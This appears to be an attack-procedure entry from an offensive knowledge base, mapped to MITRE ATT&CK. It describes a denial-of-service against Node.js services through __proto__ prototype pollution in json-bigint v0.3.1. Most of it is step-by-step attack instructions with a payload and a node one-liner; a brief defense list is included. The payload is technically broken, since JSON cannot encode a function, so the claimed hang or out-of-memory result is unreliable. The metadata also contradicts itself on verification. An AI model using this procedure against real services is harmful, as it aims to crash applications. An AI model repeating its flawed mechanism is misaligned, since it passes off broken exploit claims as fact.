---
id: proc-uuid-2
tags:
  - dos
  - prototype-pollution
  - json-parse
  - cve-2020-8237
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/node-parse-malicious-json]]'
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:30.304Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Craft and Parse Malicious JSON for DoS

## Summary

This procedure crafts a compact malicious JSON payload exploiting __proto__ assignment in json-bigint v0.3.1 to pollute the Object prototype, causing infinite loops or out-of-memory errors in bignumber.js operations during JSON parsing of untrusted input.

## Description

The json-bigint module in v0.3.1 fails to sanitize __proto__ keys during parsing, allowing attackers to set properties on Object.prototype. A small payload (~70 bytes) can define a malicious toString or valueOf function that recurses infinitely or allocates memory excessively. When the application performs arithmetic or stringification using bignumber.js, the polluted prototype triggers DoS, hanging or crashing the Node.js process. This targets backend services parsing user-supplied JSON, with high impact due to minimal payload size.

## Requirements

1. Vulnerable json-bigint v0.3.1 imported (from prior procedure)
2. bignumber.js dependency present
3. Ability to inject JSON into parsing endpoint

## Defense

Defensive measures and detection strategies:

- Validate and sanitize JSON input to block __proto__ keys
- Use secure parsers like safe-json-parse or update to patched versions
- Implement resource limits (e.g., ulimit for memory) and monitor process CPU/memory spikes
- Log parsing errors and prototype access attempts

## Objectives

1. Create and parse a polluting JSON payload
2. Trigger DoS in dependent library operations
3. Deny service to the application with untrusted input

## Instructions

### Step 1: Craft Malicious Payload

**Context**: Build a JSON string that assigns an infinite-loop function to Object.prototype.toString via __proto__, affecting bignumber.js.

Add to your Node.js script:

```javascript
const maliciousJSON = '{"__proto__":{"toString":function f(){f();return \"\";}}}';
```

> This ~70-byte payload sets a recursive toString. Expected: No errors in crafting.

### Step 2: Parse and Trigger DoS

**Context**: Parse the JSON with json-bigint and invoke a bignumber.js operation to exploit the pollution.

**Command** ([[commands/node-parse-malicious-json]]):
```bash
node -e "const JSONbig = require('json-bigint'); const BigNumber = require('bignumber.js'); const maliciousJSON = '{\"__proto__\":{\"toString\":function f(){f();return \"\";}}}'; JSONbig.parse(maliciousJSON); const bn = new BigNumber('1'); console.log(bn.toString());"
```

> Parsing pollutes the prototype; toString() recurses infinitely. Expected output: Process hangs or OOM error.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/node-parse-malicious-json]]

## Tools Used


## Tags

- dos
- prototype-pollution
- json-bigint
